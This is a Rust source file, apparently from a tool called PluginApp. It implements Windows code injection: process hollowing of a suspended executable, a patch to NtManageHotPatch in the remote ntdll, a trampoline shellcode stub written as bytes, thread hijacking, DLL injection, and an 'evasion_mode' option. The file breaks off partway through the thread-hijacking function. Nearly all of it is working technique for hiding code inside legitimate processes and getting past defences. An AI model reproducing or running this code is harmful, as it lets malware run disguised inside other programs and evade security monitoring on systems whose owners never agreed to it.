use windows::Wdk::System::Threading::PROCESSINFOCLASS;
use windows::Win32::Security::{AdjustTokenPrivileges, GetSidSubAuthority, GetSidSubAuthorityCount, LookupPrivilegeValueA, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY};
use windows::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};
use windows::Win32::System::SystemServices::IMAGE_DOS_HEADER;
use windows::{core::BOOL, Win32::{Foundation::*, System::{LibraryLoader::*, Threading::*, Memory::*, Diagnostics::{Debug::*, ToolHelp::*}}}};
use windows::Wdk::System::{Memory::NtUnmapViewOfSection, Threading::NtQueryInformationProcess};
use dll_syringe::{Syringe, process::OwnedProcess};
use windows_strings::{PSTR, PCSTR};
use crossbeam::channel::Sender;
use std::ffi::{c_void, CStr};
use crate::PluginApp;
use anyhow::Context;
use rand;

impl PluginApp {
    /// A corrected and robust implementation of process hollowing for EXEs.
    pub unsafe fn hollow_process_with_exe(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
        println!("[hollow/exe] Starting process hollowing for target: {}", target_exe);

        // 1. Create the target process in a suspended state
        let mut startup_info = STARTUPINFOA::default();
        let mut process_info = PROCESS_INFORMATION::default();
        let mut command_line = format!("{}\0", target_exe);
        let success = unsafe {
            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                false,
                CREATE_SUSPENDED,
                None,
                None,
                &startup_info,
                &mut process_info,
            )
        };
        if !success.is_ok() {
            return Err(anyhow::anyhow!("CreateProcessA failed"));
        }
        println!("[hollow/exe] Suspended process created. PID: {}", process_info.dwProcessId);

        let h_process = process_info.hProcess;
        let h_thread = process_info.hThread;

        // 2. Get the PEB address and image base address
        let mut pbi = PROCESS_BASIC_INFORMATION::default();
        let status = unsafe {
            NtQueryInformationProcess(
                h_process,
                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
                &mut pbi as *mut _ as *mut c_void,
                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
                std::ptr::null_mut(),
            )
        };
        if !status.is_ok() {
            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
        }
        println!("[hollow/exe] Remote PEB at: {:?}", pbi.PebBaseAddress);

        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
        unsafe {
            ReadProcessMemory(
                h_process,
                image_base_addr_ptr,
                remote_image_base_buf.as_mut_ptr() as *mut c_void,
                remote_image_base_buf.len(),
                None,
            )?
        };
        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
        println!("[hollow/exe] Original image base: 0x{:X}", remote_image_base);

        // 3. Unmap the original executable
        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
        if status.is_err() {
            println!("[hollow/exe][warn] NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
        } else {
            println!("[hollow/exe] NtUnmapViewOfSection succeeded.");
        }

        // 4. Parse PE headers
        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        let optional_header = unsafe { &mut (*nt_headers_ptr).OptionalHeader };
        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
        let image_base = optional_header.ImageBase as usize;
        let entry_rva = optional_header.AddressOfEntryPoint;
        let size_of_image = optional_header.SizeOfImage as usize;
        let size_of_headers = optional_header.SizeOfHeaders as usize;
        println!("[hollow/exe] Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);

        // 5. Allocate memory for the new image
        let mut new_base = unsafe {
            VirtualAllocEx(
                h_process,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            )
        } as usize;
        if new_base == 0 {
            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
        }
        println!("[hollow/exe] New image allocated at: 0x{:X}", new_base);

        // 6. Patch image base in local headers before writing
        optional_header.ImageBase = new_base as u64;

        // 7. Write PE headers
        let write_headers = unsafe {
            WriteProcessMemory(
                h_process,
                new_base as *mut c_void,
                pe_data.as_ptr() as *const c_void,
                size_of_headers,
                None,
            )
        };
        if !write_headers.is_ok() {
            return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed"));
        }
        println!("[hollow/exe] Headers written at: 0x{:X}", new_base);

        // 8. Write sections
        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };
        for section in sections {
            let dest = (new_base + section.VirtualAddress as usize) as *mut c_void;
            let src_offset = section.PointerToRawData as usize;
            let raw_size = section.SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }
            if src_offset + raw_size > pe_data.len() {
                println!("[hollow/exe][warn] Section {} out of bounds, skipping", String::from_utf8_lossy(&section.Name));
                continue;
            }
            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
            let write_section = unsafe {
                WriteProcessMemory(
                    h_process,
                    dest,
                    src,
                    raw_size,
                    None,
                )
            };
            if !write_section.is_ok() {
                println!("[hollow/exe][warn] WriteProcessMemory failed for section {}", String::from_utf8_lossy(&section.Name));
            } else {
                println!("[hollow/exe] Section {} written at: 0x{:X}", String::from_utf8_lossy(&section.Name), dest as usize);
            }
        }

        // 9. Update PEB image base
        let new_base_bytes = new_base.to_le_bytes();
        unsafe {
            WriteProcessMemory(
                h_process,
                image_base_addr_ptr,
                new_base_bytes.as_ptr() as *const c_void,
                new_base_bytes.len(),
                None,
            )?
        };
        println!("[hollow/exe] Remote PEB image base updated to 0x{:X}", new_base);

        // 10. Apply relocations if needed
        if new_base != image_base {
            let delta = new_base.wrapping_sub(image_base);
            println!("[hollow/exe] Applying relocations (delta: 0x{:X})...", delta);
            Self::apply_relocations(pe_data, h_process, new_base, image_base)?;
        } else {
            println!("[hollow/exe] No relocations needed.");
        }

        // 11. Resolve imports
        println!("[hollow/exe] Resolving imports...");
        Self::resolve_imports(pe_data, h_process, new_base as *mut c_void)?;


        // 12. Set memory protection for the whole image (for reliability)
        let mut old_protect  = PAGE_PROTECTION_FLAGS(0);
        let protect_res = unsafe {
            VirtualProtectEx(
                h_process,
                new_base as *mut c_void,
                size_of_image,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            )
        };

        if let Err(e) = protect_res {
            println!("[hollow/exe][warn] VirtualProtectEx failed for image: {e:?}");
        } else {
            println!("[hollow/exe] VirtualProtectEx succeeded for image");
        }

        // 12b. Patch NtManageHotPatch in remote process for Win11 24H2+ compatibility
        if let Err(e) = Self::patch_nt_manage_hotpatch64(h_process) {
            println!("[hollow/exe][warn] patch_nt_manage_hotpatch64 failed: {e}");
        } else {
            println!("[hollow/exe] NtManageHotPatch64 patched successfully");
        }

        // 13. Set thread context to new entry point
        let mut context = CONTEXT::default();
        context.ContextFlags = CONTEXT_ALL_AMD64;
        let get_ctx = unsafe { GetThreadContext(h_thread, &mut context) };
        if let Err(e) = get_ctx {
            return Err(anyhow::anyhow!("GetThreadContext failed: {e:?}"));
        }
        #[cfg(target_arch = "x86_64")]
        {
            context.Rip = new_base as u64 + entry_rva as u64;
        }
        #[cfg(target_arch = "x86")]
        {
            context.Eip = (new_base as u32).wrapping_add(entry_rva);
        }
        println!("[hollow/exe] Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
        let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
        if let Err(e) = set_ctx {
            return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
        }

        // 14. Resume thread
        println!("[hollow/exe] Resuming main thread...");
        let resume_count = unsafe { ResumeThread(h_thread) };
        if resume_count == u32::MAX {
            return Err(anyhow::anyhow!("ResumeThread failed"));
        }
        println!("[hollow/exe] ResumeThread returned: {}", resume_count);

        println!("[hollow/exe] Hollowing complete. New process PID: {}", process_info.dwProcessId);

        // Clean up handles
        unsafe { CloseHandle(h_thread) }?;
        unsafe { CloseHandle(h_process) }?;

        Ok(process_info.dwProcessId)
    }
        
    /// Patch NtManageHotPatch syscall stub in remote process for Win11 24H2+ hollowing compatibility
    pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use windows_strings::PCSTR;
        use std::ffi::c_void;

        // Get local ntdll base and NtManageHotPatch offset
        let ntdll = unsafe { GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) }?;
        let ntmanage_addr = unsafe { GetProcAddress(ntdll, PCSTR(b"NtManageHotPatch\0".as_ptr())) };
        let ntmanage_addr = match ntmanage_addr {
            Some(ptr) => ptr as *const c_void,
            None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
        };
        let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
        // Get remote ntdll base in target process
        let remote_ntdll = Self::get_remote_module_base_handle(h_process, "ntdll.dll")?;
        if remote_ntdll.is_null() {
            return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
        }
        let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;

        // Prepare patch bytes: mov eax, C00000BB; ret
        let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
        let stub_size = 0x20;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // Change protection to RW
        let vp = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_READWRITE, &mut old_protect) };
        if !vp.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx failed"));
        }
        // Read original stub for validation (optional)
        let mut orig_stub = [0u8; 0x20];
        let mut out_bytes = 0usize;
        let rp = unsafe { ReadProcessMemory(h_process, remote_patch_addr, orig_stub.as_mut_ptr() as *mut c_void, stub_size, Some(&mut out_bytes)) };
        if !rp.is_ok() || out_bytes < 6 {
            return Err(anyhow::anyhow!("ReadProcessMemory failed"));
        }
        // Write patch
        let wp = unsafe { WriteProcessMemory(h_process, remote_patch_addr, patch.as_ptr() as *const c_void, patch.len(), Some(&mut out_bytes)) };
        if !wp.is_ok() || out_bytes != patch.len() {
            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
        }
        // Restore protection
        let vp2 = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_EXECUTE_READ, &mut old_protect) };
        if !vp2.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx restore failed"));
        }
        // Flush instruction cache
        let _ = unsafe { FlushInstructionCache(h_process, Some(remote_patch_addr), patch.len()) };
        Ok(())
    }

    /// Get remote module base address (HANDLE) for a given DLL name in a process
    pub fn get_remote_module_base_handle(h_process: HANDLE, module_name: &str) -> anyhow::Result<*mut c_void, anyhow::Error> {
        use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE};
        use std::ffi::CStr;
        let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, windows::Win32::System::Threading::GetProcessId(h_process) ) };
        if !snapshot.is_ok() {
            return Err(anyhow::anyhow!("CreateToolhelp32Snapshot failed"));
        }
        let snapshot = snapshot.unwrap();
        let mut entry = MODULEENTRY32 { dwSize: std::mem::size_of::<MODULEENTRY32>() as u32, ..Default::default() };
        let mut found = None;
        if unsafe { Module32First(snapshot, &mut entry) }.is_ok() {
            loop {
                let name_ptr = entry.szModule.as_ptr();
                let name_cstr = unsafe { CStr::from_ptr(name_ptr) };
                let name_str = name_cstr.to_string_lossy().trim_end_matches(char::from(0)).to_lowercase();
                if name_str == module_name.to_lowercase() {
                    found = Some(entry.modBaseAddr as *mut c_void);
                    break;
                }
                if unsafe { Module32Next(snapshot, &mut entry) }.is_err() {
                    break;
                }
            }
        }
        unsafe { windows::Win32::Foundation::CloseHandle(snapshot) };
        found.ok_or_else(|| anyhow::anyhow!("Module {} not found in remote process", module_name))
    }
    
    /// Call an exported DLL function in a hollowed process
    /// Arguments:
    /// - process_handle: HANDLE to the hollowed process
    /// - dll_data: &[u8] of the DLL image
    /// - dll_base: base address where DLL is mapped in remote process
    /// - export_name: name of the exported function to call
    pub unsafe fn call_export_in_hollowed_process(
        process_handle: HANDLE,
        dll_data: &[u8],
        dll_base: usize,
        export_name: &str,
    ) -> anyhow::Result<(), anyhow::Error> {
        // Get the RVA of the export
        let export_rva = Self::get_export_rva(dll_data, export_name)?;
        println!("export_rva: {export_rva}");
        let remote_addr = dll_base + export_rva as usize;
        println!("remote_addr: {remote_addr}");

        // Print process handle value for diagnostics
        println!("[diagnostic] process_handle: 0x{:X}", process_handle.0 as usize);

        // Print integrity level of the target process
        match Self::get_process_integrity_level(process_handle) {
            Ok(level) => println!("[diagnostic] target process integrity level: {level:?}"),
            Err(e) => println!("[diagnostic] failed to get integrity level: {e}"),
        }

        // Check memory protection at remote_addr in the remote process
        use windows::Win32::System::Memory::VirtualQueryEx;
        use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
        let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
        let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
        let vq_res = unsafe {
            VirtualQueryEx(
                process_handle,
                Some(remote_addr as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            )
        };
        if vq_res == 0 {
            println!("VirtualQueryEx failed for remote_addr: 0x{:X}", remote_addr);
        } else {
            let mbi = unsafe { mbi.assume_init() };
            println!("VirtualQueryEx: BaseAddress=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
        }

        // Resume the main thread if you have it (required for hollowed process)
        // This function now expects the caller to resume the thread before calling this export
        // If you have the main thread handle, resume it here
        // (If not, document that the caller must resume the thread before calling this function)

        // Print a warning if the process might still be suspended
        // (You may want to pass/process_info.hThread here for full automation)

        // EXTREMELY VERBOSE LOGGING for CreateRemoteThread
        println!("[VERBOSE] About to call CreateRemoteThread:");
        println!("  process_handle: 0x{:X}", process_handle.0 as usize);
        println!("  remote_addr (export): 0x{:X}", remote_addr);
        println!("  remote_addr as fn ptr: {:?}", std::mem::transmute::<usize, *const ()>(remote_addr));
        println!("  Parameters: lpThreadAttributes=None, dwStackSize=0, lpParameter=None, dwCreationFlags=0, lpThreadId=None");
        // Check process handle rights
        use windows::Win32::System::Threading::GetProcessId;
        let pid = unsafe { GetProcessId(process_handle) };
        println!("  Target PID: {}", pid);
        // Try to create the remote thread
        let thread_handle = unsafe {
            CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(remote_addr)),
                None,
                0,
                None,
            )
        };

        match thread_handle {
            Ok(handle) => {
                println!("[VERBOSE] CreateRemoteThread returned handle: 0x{:X}", handle.0 as usize);
                if handle.is_invalid() {
                    println!("[ERROR] CreateRemoteThread returned invalid handle!");
                    return Err(anyhow::anyhow!("CreateRemoteThread failed (invalid handle)"));
                }
                let wait_res = unsafe { WaitForSingleObject(handle, INFINITE) };
                println!("[VERBOSE] WaitForSingleObject returned: 0x{:X}", wait_res.0);
                let close_res = unsafe { CloseHandle(handle) };
                println!("[VERBOSE] CloseHandle returned: {:?}", close_res);
                Ok(())
            },
            Err(e) => {
                // Print all parameters and error
                println!("[ERROR] CreateRemoteThread failed: {e:?}");
                println!("[ERROR] Parameters:");
                println!("  process_handle: 0x{:X}", process_handle.0 as usize);
                println!("  remote_addr: 0x{:X}", remote_addr);
                println!("  remote_addr as fn ptr: {:?}", std::mem::transmute::<usize, *const ()>(remote_addr));
                println!("  export_name: {}", export_name);
                println!("  dll_base: 0x{:X}", dll_base);
                println!("  export_rva: 0x{:X}", export_rva);
                println!("  Target PID: {}", pid);
                // Try to get last error
                use windows::Win32::Foundation::GetLastError;
                let last_error = unsafe { GetLastError() };
                println!("  GetLastError: 0x{:X}", last_error.0);
                Err(anyhow::anyhow!("CreateRemoteThread: {e:?} (remote_addr: 0x{:X}, process_handle: 0x{:X}, GetLastError: 0x{:X})", remote_addr, process_handle.0 as usize, last_error.0))
            }
        }
    }

    // Helper to get the integrity level of a process
    pub fn get_process_integrity_level(process_handle: HANDLE) -> anyhow::Result<String, anyhow::Error> {
        use windows::Win32::Security::{GetTokenInformation, TokenIntegrityLevel, TOKEN_MANDATORY_LABEL, TOKEN_QUERY};
        use std::ptr;

        unsafe {
            let mut h_token = HANDLE(ptr::null_mut());
            OpenProcessToken(process_handle, TOKEN_QUERY, &mut h_token)
                .map_err(|e| anyhow::anyhow!("OpenProcessToken (for integrity level) failed: {e}"))?;

            // Query buffer size
            let mut size = 0u32;
            let _ = GetTokenInformation(
                h_token,
                TokenIntegrityLevel,
                None,
                0,
                &mut size,
            );
            if size == 0 {
                return Err(anyhow::anyhow!("GetTokenInformation (size query) failed"));
            }

            let mut buf = vec![0u8; size as usize];
            let ok = GetTokenInformation(
                h_token,
                TokenIntegrityLevel,
                Some(buf.as_mut_ptr() as *mut _),
                size,
                &mut size,
            );
            if !ok.is_ok() {
                return Err(anyhow::anyhow!("GetTokenInformation (data) failed"));
            }

            let tml = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
            let p_sid = tml.Label.Sid;
            if p_sid.is_invalid() {
                return Err(anyhow::anyhow!("SID is invalid"));
            }

            let sub_auth_count = *GetSidSubAuthorityCount(p_sid);
            if sub_auth_count == 0 {
                return Err(anyhow::anyhow!("SID has no subauthorities"));
            }
            let rid = *GetSidSubAuthority(p_sid, (sub_auth_count - 1) as u32);

            let level = match rid {
                0x0000_0000 => "Untrusted",
                0x0000_1000 => "Low",
                0x0000_2000 => "Medium",
                0x0000_2100 => "Medium Plus",
                0x0000_3000 => "High",
                0x0000_4000 => "System",
                0x0000_5000 => "Protected Process",
                _ => "Other"
            };
            Ok(level.to_string())
        }
    }

    // Improved process hollowing with proper PE handling
    pub unsafe fn get_process_info(exe_path: &str) -> Result<(PROCESS_INFORMATION, HANDLE), String> {
        unsafe {
            let mut startup_info = STARTUPINFOA::default();
            let mut process_info = PROCESS_INFORMATION::default();
            let mut command_line = format!("{}\0", exe_path);

            CreateProcessA(
                None,
                Some(PSTR(command_line.as_mut_ptr())),
                None,
                None,
                BOOL(0).into(),
                CREATE_SUSPENDED,
                None,
                None,
                &mut startup_info,
                &mut process_info,
            )
            .map_err(|e| format!("CreateProcessA failed: {}", e))?;

            // Open process with PROCESS_ALL_ACCESS for injection
            let h_process = OpenProcess(
                PROCESS_ALL_ACCESS,
                FALSE.into(),
                process_info.dwProcessId
            ).map_err(|e| format!("OpenProcess(PROCESS_ALL_ACCESS) failed: {}", e))?;

            // Return both process_info and h_process so caller can resume main thread
            Ok((process_info, h_process))
        }
    }

    // Improved process hollowing with proper relocations and IAT
    pub unsafe fn inject_hollowed_process_improved(
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        main_thread_handle: HANDLE
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
        println!("[hollow] Starting inject_hollowed_process_improved");
            // Get proper entry point and base address
            let (preferred_base, entry_rva, size_of_image) = Self::parse_pe_headers(dll_data)?;

            // Try to allocate at preferred base first, fallback if needed
            let mut alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                println!("Alloc is NULL");
                // Fallback allocation
                alloc = VirtualAllocEx(
                    process_handle,
                    None,
                    size_of_image,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE,
                );
                if alloc.is_null() {
                    println!("[hollow][error] VirtualAllocEx failed");
                    return Err(anyhow::anyhow!("VirtualAllocEx failed"));
                }
            }

            let actual_base = alloc as usize;
            println!("[hollow] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);
            println!("[debug] DLL allocated at 0x{:X} (size: 0x{:X})", actual_base, size_of_image);

            // Debug: check memory protection of allocated region
            use windows::Win32::System::Memory::VirtualQueryEx;
            use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
            let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
            let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
            let vq_res = VirtualQueryEx(
                process_handle,
                Some(actual_base as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            );
            if vq_res == 0 {
                println!("[debug] VirtualQueryEx failed for alloc: 0x{:X}", actual_base);
            } else {
                let mbi = mbi.assume_init();
                println!("[debug] VirtualQueryEx alloc: Base=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                    mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
            }

            // Map PE sections
            println!("[hollow] Mapping PE sections");
            Self::map_pe_sections(dll_data, process_handle, alloc)?;

            // Apply relocations if base changed
            if actual_base != preferred_base {
                println!("[hollow] Applying relocations");
                Self::apply_relocations(dll_data, process_handle, actual_base, preferred_base)?;
            }

            // Resolve imports (IAT fixups)
            println!("[hollow] Resolving imports");
            Self::resolve_imports(dll_data, process_handle, alloc)?;
            // // Get function RVA and calculate remote address
            // let function_rva = Self::get_export_rva(dll_data, function_name)?;
            // let remote_export = actual_base + function_rva as usize;

            // // --- Shellcode stub (x64) ---
            // // mov rcx, 0
            // // mov rax, <remote_export>
            // // call rax
            // // mov ecx, 0
            // // mov rax, <ExitProcess>
            // // call rax
            // // ret
            // let exit_process = GetProcAddress(
            //     GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap(),
            //     PCSTR(b"ExitProcess\0".as_ptr()),
            // ).unwrap() as usize;

            // let mut shellcode: Vec<u8> = vec![
            //     0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
            //     0x48, 0xB8, // mov rax, <remote_export>
            // ];
            // shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            // shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            // shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            // shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            // shellcode.push(0xC3); // ret

            // // Allocate memory for shellcode
            // let shellcode_addr = VirtualAllocEx(
            //     process_handle,
            //     None,
            //     shellcode.len(),
            //     MEM_COMMIT | MEM_RESERVE,
            //     PAGE_EXECUTE_READWRITE,
            // );
            // if shellcode_addr.is_null() {
            //     return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            // }
            // WriteProcessMemory(
            //     process_handle,
            //     shellcode_addr,
            //     shellcode.as_ptr() as _,
            //     shellcode.len(),
            //     None,
            // ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // // Patch the main thread context to start at the shellcode stub
            // println!("[info] Setting main thread context to shellcode stub (calls export, then ExitProcess)");

            // --- Trampoline shellcode approach ---
            // 1. Allocate memory for shellcode in remote process
            // 2. Write shellcode: call export, then call ExitProcess
            // 3. Patch main thread context to shellcode
            // 4. Resume main thread

            // Get export address
            let function_rva = Self::get_export_rva(dll_data, function_name)?;
            let remote_export = actual_base + function_rva as usize;
            println!("[hollow] Trampoline: export '{}' at 0x{:X}", function_name, remote_export);

            // Get ExitProcess address
            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
            let exit_process = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr())).unwrap() as usize;

            // x64 shellcode:
            // mov rcx, 0
            // mov rax, <remote_export>
            // call rax
            // mov ecx, 0
            // mov rax, <ExitProcess>
            // call rax
            // ret
            let mut shellcode: Vec<u8> = vec![
                0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
                0x48, 0xB8, // mov rax, <remote_export>
            ];
            shellcode.extend_from_slice(&(remote_export as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.extend_from_slice(&[0xB9, 0x00, 0x00, 0x00, 0x00]); // mov ecx, 0
            shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax, <ExitProcess>
            shellcode.extend_from_slice(&(exit_process as u64).to_le_bytes());
            shellcode.extend_from_slice(&[0xFF, 0xD0]); // call rax
            shellcode.push(0xC3); // ret

            // Allocate memory for shellcode
            let shellcode_addr = VirtualAllocEx(
                process_handle,
                None,
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if shellcode_addr.is_null() {
                println!("[hollow][error] VirtualAllocEx for shellcode failed");
                return Err(anyhow::anyhow!("VirtualAllocEx for shellcode failed"));
            }
            // Write shellcode
            WriteProcessMemory(
                process_handle,
                shellcode_addr,
                shellcode.as_ptr() as _,
                shellcode.len(),
                None,
            ).map_err(|e| anyhow::anyhow!("WriteProcessMemory(shellcode) failed: {}", e))?;

            // Patch main thread context to shellcode
            println!("[hollow] Patching main thread context to trampoline shellcode at 0x{:X}", shellcode_addr as usize);
            let mut context = CONTEXT::default();
            #[cfg(target_arch = "x86_64")]
            {
                context.ContextFlags = CONTEXT_ALL_AMD64;
            }
            #[cfg(target_arch = "x86")]
            {
                context.ContextFlags = CONTEXT_ALL_X86;
            }
            GetThreadContext(main_thread_handle, &mut context)?;
            #[cfg(target_arch = "x86_64")]
            {
                context.Rip = shellcode_addr as u64;
                println!("[info] Set CONTEXT.Rip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            #[cfg(target_arch = "x86")]
            {
                context.Eip = shellcode_addr as u32;
                println!("[info] Set CONTEXT.Eip = 0x{:X} (trampoline shellcode)", shellcode_addr as usize);
            }
            SetThreadContext(main_thread_handle, &context)?;

            println!("[info] Main thread context patched. Resuming main thread...");
            // let resume_count = ResumeThread(main_thread_handle);
            // println!("[info] ResumeThread(main) returned: {}", resume_count);
            println!("[hollow] Hollowing complete. Export will be called by trampoline shellcode.");
            Ok(())
        }
    }

    // Classic DLL injection with options
    pub async unsafe fn inject_dll_with_options(
        pid: sysinfo::Pid, 
        plugin_dir: &str, 
        plugin: &str, 
        function: &str,
        use_thread_hijacking: bool,
        evasion_mode: bool
    ) -> anyhow::Result<(), anyhow::Error> {
        if evasion_mode {
            // Apply basic evasion techniques
            unsafe { Self::apply_basic_evasion() }.await?;
        }

        let path = format!("{}\\{}", plugin_dir, plugin);
        println!("Injecting DLL: {} into PID: {}", path, pid);
        
        if use_thread_hijacking {
            unsafe { Self::inject_via_thread_hijacking(pid, &path, function) }.await
        } else {
            unsafe { Self::inject_dll(pid, plugin_dir, plugin, function) }.await
        }
    }

    // Thread hijacking injection method
    pub async unsafe fn inject_via_thread_hijacking(
        pid: sysinfo::Pid,
        dll_path: &str,
        function: &str
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            let h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE.into(), pid.as_u32())
                .map_err(|e| anyhow::anyhow!("OpenProcess failed for PID {} (access denied - try running as administrator): {}", pid.as_u32(), e))?;

            // Find a suitable thread to hijack
            let thread_id = Self::find_hijackable_thread(pid.as_u32())?;
            let h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE.into(), thread_id)
                .map_err(|e| anyhow::anyhow!("OpenThread failed for thread {}: {}", thread_id, e))?;

            // Suspend the thread
            SuspendThread(h_thread);

            // Get thread context
            let mut context = CONTEXT { 
                ContextFlags: CONTEXT_FULL_AMD64, 
                ..Default::default() 
            };
            GetThreadContext(h_thread, &mut context)
                .map_err(|e| {
                    ResumeThread(h_thread);
                    anyhow::anyhow!("GetThreadContext failed: {}", e)
                })?;

            // Allocate memory for DLL path
            let dll_path_bytes = dll_path.as_bytes();
            let path_alloc = VirtualAllocEx(
                h_process,
                None,
                dll_path_bytes.len() + 1,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );

            if path_alloc.is_null() {
                ResumeThread(h_thread);
                CloseHandle(h_thread).ok();
                CloseHandle(h_process).ok();
                return Err(anyhow::anyhow!("VirtualAllocEx for DLL path failed - insufficient privileges"));
            }

            // Write DLL path
            WriteProcessMemory(
                h_process,
                path_alloc,
                dll_path_bytes.as_ptr() as _,
                dll_path_bytes.len(),
                None,
            ).map_err(|e| {
                ResumeThread(h_thread);
                let virt_free_ex = VirtualFreeEx(h_process, path_alloc, 0, MEM_RELEASE);
                println!("VirtualFreeEx: {virt_free_ex:?}");
                CloseHandle(h_thread).ok();
                CloseHandle(h_process).ok();
                anyhow::anyhow!("WriteProcessMemory failed: {}", e)
            })?;

            // Get LoadLibraryA address
            let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr()))
                .map_err(|e| {
                    ResumeThread(h_thread);
